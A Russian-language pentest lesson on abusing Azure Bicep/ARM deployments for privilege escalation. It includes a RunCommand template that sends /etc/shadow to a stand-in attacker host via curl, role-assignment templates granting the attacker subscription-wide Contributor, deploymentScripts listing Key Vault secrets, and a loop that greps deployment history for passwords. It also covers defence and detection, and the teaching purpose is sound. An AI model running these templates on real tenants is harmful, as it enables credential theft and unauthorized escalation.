---
id: cloud-bicep
title: "Azure Bicep: компиляция в ARM и эскалация через deployments"
category: cloud
parent: cloud-iac-deep
difficulty: hard
order: 2
tags: [cloud, azure, bicep, arm, deployments, privesc, runcommand, managed-identity]
prerequisites: [cloud-iac-deep, cloud-azure-arm]
useful_for:
  - "Пентест Azure IaC"
  - "Эскалация через deployments"
  - "Анализ Bicep-шаблонов"
estimated_minutes: 45
summary: "Bicep: компиляция в ARM, deployments и PassRole по-azure'овски. Как из шаблона выполнить команду на VM через RunCommand или назначить роль managed identity."
---

## Зачем этот урок

Bicep — DSL для описания Azure-инфраструктуры, компилируемый в ARM-шаблоны. Для атакующего Bicep интересен ровно тем же, чем ARM: **deployments** позволяют выполнять действия от имени прав деплоймента, в том числе запускать `RunCommand` на VM и назначать роли managed identity. Если у вас есть право `Microsoft.Resources/deployments/write` (Contributor), вы можете «PassRole по-azure'овски» — развернуть шаблон, который даст вашей identity больше прав или выполнит код на машине. Bicep — просто удобная обёртка, модель прав та же.

## Модель Bicep и deployments

- **Bicep-файл** (`main.bicep`) компилируется в ARM JSON (`az bicep build`).
- **Deployment** — операция применения шаблона; scope: resource group, subscription, management group, tenant.
- **deploymentScripts** (`Microsoft.Resources/deploymentScripts`) — выполняют скрипт в контейнере с указанной identity.
- **RunCommand** (`Microsoft.Compute/virtualMachines/runCommand`) — выполняет команду на VM.
- **Role assignments** — назначение роли принципалу (в т.ч. вашей identity).
- **`assignIdentity`/`userAssignedIdentities`** — привязка identity к ресурсу.

Ключевые права: `Microsoft.Resources/deployments/write`, `Microsoft.Authorization/roleAssignments/write`, `Microsoft.Compute/virtualMachines/runCommand/action`.

## Инструменты и команды

```bash
# Компиляция Bicep
az bicep build --file main.bicep --outfile main.json

# Развёртывание
az deployment group create --resource-group rg --template-file main.bicep
az deployment sub create --location westeurope --template-file main.bicep

# What-if (план)
az deployment group what-if --resource-group rg --template-file main.bicep

# Список deployments (что делали до нас)
az deployment group list --resource-group rg --query '[].{Name:name,State:properties.provisioningState}'
az deployment group show --resource-group rg --name <name> --query 'properties.parameters'
```

## Разобранный пример: deployment с RunCommand на VM

Сценарий: у нас есть Contributor на resource group, где есть VM.

```bicep
// evil.bicep
targetScope = 'resourceGroup'
param vmName string = 'prod-vm'

resource runCmd 'Microsoft.Compute/virtualMachines/runCommand@2023-03-01' = {
  name: '${vmName}/exfil'
  properties: {
    commandId: 'RunShellScript'
    script: 'curl http://attacker.example.com/x -d "$(cat /etc/shadow | base64)"'
  }
}
```

```bash
az deployment group create --resource-group rg --template-file evil.bicep
# {"properties": {"provisioningState": "Succeeded", ...}}
```

Через минуту скрипт выполнился на VM от имени системы. Аналогично можно назначить роль:

```bicep
resource roleAssign 'Microsoft.Authorization/roleAssignments@2022-04-01' = {
  name: guid(resourceGroup().id, 'attacker', 'Contributor')
  properties: {
    roleDefinitionId: subscriptionResourceId('Microsoft.Authorization/roleDefinitions', 'b24988ac-6180-42a0-ab88-20f7382dd24c') // Contributor
    principalId: '<your-object-id>'
    principalType: 'User'
  }
}
```

Если у вас есть `roleAssignments/write`, вы назначаете себе Owner/Contributor на подписку.

## DeploymentScripts

`deploymentScripts` выполняют произвольный скрипт (Azure CLI/PowerShell) в контейнере с указанной identity. Это удобный способ выполнить код без VM.

```bicep
resource script 'Microsoft.Resources/deploymentScripts@2023-08-01' = {
  name: 'exfil'
  location: 'westeurope'
  kind: 'AzureCLI'
  identity: { type: 'UserAssigned', userAssignedIdentities: { '<id>': {} } }
  properties: {
    azCliVersion: '2.50.0'
    scriptContent: 'az account show; az keyvault secret list --vault-name prod-kv'
    retentionInterval: 'PT1H'
  }
}
```

## Чек-лист атаки

1. Проверить `deployments/write` на scope (RG/subscription).
2. Проверить `roleAssignments/write` — прямой путь к Owner.
3. Проверить `virtualMachines/runCommand/action`.
4. Проверить deploymentScripts.
5. Проверить существующие deployments (параметры могут содержать секреты).
6. Проверить managed identity деплоймента.
7. Проверить, можно ли развернуть на management group/tenant scope.

## Обход защит и edge cases

- **Deny assignments.** Azure Policy может запрещать `runCommand`/`roleAssignments`. Проверяйте `az policy assignment list`.
- **Scope ограничения.** Contributor на RG не даёт прав на subscription; проверяйте scope.
- **Managed identity деплоймента.** Deployment использует identity вызывающего; можно указать user-assigned identity, если есть права.
- **What-if vs create.** `what-if` показывает план; можно использовать для проверки без изменений.
- **Deployment history.** Хранит параметры/выводы; может содержать секреты.

## Частые ошибки и подводные камни

- Считать Bicep «просто кодом» и не проверять модель прав.
- Игнорировать `roleAssignments/write` — это прямой путь к Owner.
- Не проверить policy deny assignments.
- Забыть про deploymentScripts как RCE-примитив.
- Не проверить историю deployments.

## Защита и детект

- Ограничить `deployments/write` и `roleAssignments/write`; использовать PIM/just-in-time.
- Применять Azure Policy deny для `runCommand`/`roleAssignments`.
- Ограничить scope деплойментов; не давать subscription-level Contributor.
- Аудит: Azure Activity на deployments и roleAssignments; алертить.
- Защитить историю deployments (параметры могут содержать секреты).

## Модель угроз и типовые мисконфиги

Типичный мисконфиг — Contributor на подписку. Второй — `roleAssignments/write` без ограничений. Третий — RunCommand разрешён. Четвёртый — deploymentScripts. Пятый — секреты в параметрах deployments. Все ведут к эскалации/RCE.

## Практическое задание

1. Разверните Bicep-шаблон с RunCommand на тестовой VM.
2. Разверните шаблон, назначающий Contributor вашей identity.
3. Настройте policy deny и проверьте блокировку.
4. Скомпилируйте Bicep и сравните с ARM JSON.

## Что дальше / решение

Deployments дают RCE и эскалацию. Дальше — использовать полученные права. Зафиксируйте путь «deployments → RunCommand/roleAssignment» в графе. При policy deny — ищите другие scope или managed identity.

## Разобранный пример 2: deploymentScripts и назначение роли

Самый прямой путь эскалации — развернуть шаблон, который назначает вашей identity роль Owner. Это «PassRole по-azure'овски»: deployment выполняется от имени вызывающего, а значит, может выдать ему права.

```bicep
// escalate.bicep
targetScope = 'subscription'
param principalId string = '<your-object-id>'

// Назначаем Contributor на всю подписку
resource contrib 'Microsoft.Authorization/roleAssignments@2022-04-01' = {
  name: guid(subscription().id, principalId, 'contrib')
  properties: {
    roleDefinitionId: subscriptionResourceId('Microsoft.Authorization/roleDefinitions', 'b24988ac-6180-42a0-ab88-20f7382dd24c')
    principalId: principalId
    principalType: 'User'
  }
}

// Плюс deploymentScript для немедленного использования прав
resource script 'Microsoft.Resources/deploymentScripts@2023-08-01' = {
  name: 'enum'
  location: 'westeurope'
  kind: 'AzureCLI'
  properties: {
    azCliVersion: '2.50.0'
    scriptContent: 'az role assignment list --all --query "[].{p:principalName,r:roleDefinitionName}"'
    retentionInterval: 'PT1H'
  }
}
```

```bash
az deployment sub create --location westeurope --template-file escalate.bicep
```

После этого ваша identity имеет Contributor/Owner. Если `roleAssignments/write` запрещён политикой, используйте `runCommand` на VM или `deploymentScripts` с существующей привилегированной identity. Всегда проверяйте `az policy assignment list` — deny-политики могут блокировать эти пути.

## Историю deployments и параметры

История развёртываний хранит параметры и выводы — иногда с секретами.

```bash
# Список deployments и их параметры
az deployment group list --resource-group rg --query '[].name' -o tsv | while read d; do
  echo "== $d =="
  az deployment group show --resource-group rg --name "$d" --query 'properties.parameters' -o json
done | grep -iE 'password|secret|key|token'

# Выводы (outputs) могут содержать строки подключения
az deployment group show --resource-group rg --name <name> --query 'properties.outputs'
# {"connectionString": {"value": "Server=...;Password=..."}}
```

Строки подключения, пароли и ключи часто попадают в параметры или outputs. Это ещё один канал утечки: даже без доступа к Key Vault можно найти секреты в истории деплойментов. Проверяйте также `az deployment operation group list` — детальные операции содержат запросы/ответы.

## Сравнение Bicep и ARM на практике

| Аспект | ARM JSON | Bicep |
|---|---|---|
| Читаемость | Многословный JSON | Компактный DSL |
| Компиляция | Напрямую | `az bicep build` → ARM |
| Модель прав | Одинаковая (deployments) | Одинаковая |
| Модули | nested templates | `module` |
| Эскалация | runCommand/roleAssignments | Те же ресурсы |

Вывод для атакующего: не важно, написан ли шаблон на Bicep или ARM — права и примитивы эскалации идентичны. При анализе исходников репозитория ищите `Microsoft.Authorization/roleAssignments`, `runCommand`, `deploymentScripts` и `userAssignedIdentities` — независимо от синтаксиса.

## Квиз

```quiz
- question: "Во что компилируется Bicep?"
  options:
    - "В ARM JSON, разворачиваемый тем же deployments-механизмом"
    - "В Docker-образ"
    - "В Terraform"
    - "В Kubernetes-манифест"
  answer: 0
  explanation: "Bicep — DSL поверх ARM."
- question: "Какой ресурс позволяет выполнить команду на VM?"
  options:
    - "Microsoft.Compute/virtualMachines/runCommand"
    - "Microsoft.Storage/buckets"
    - "Microsoft.Network/vnets"
    - "Microsoft.KeyVault/vaults"
  answer: 0
  explanation: "runCommand исполняет скрипт на VM."
- question: "Какое право даёт назначить себе Owner?"
  options:
    - "Microsoft.Authorization/roleAssignments/write"
    - "Microsoft.Compute/read"
    - "Microsoft.Storage/read"
    - "Microsoft.Network/read"
  answer: 0
  explanation: "roleAssignments/write позволяет назначать роли."
- question: "Что делают deploymentScripts?"
  options:
    - "Выполняют скрипт в контейнере с указанной identity"
    - "Шифруют диск"
    - "Меняют DNS"
    - "Создают VNet"
  answer: 0
  explanation: "deploymentScripts запускают AzureCLI/PowerShell в контейнере."
```

## Где пригодится

- **Пентест Azure:** эскалация через deployments.
- **Red team:** RCE через RunCommand.
- **Blue team:** настройка policy deny.
- **Сертификация:** AZ-500.
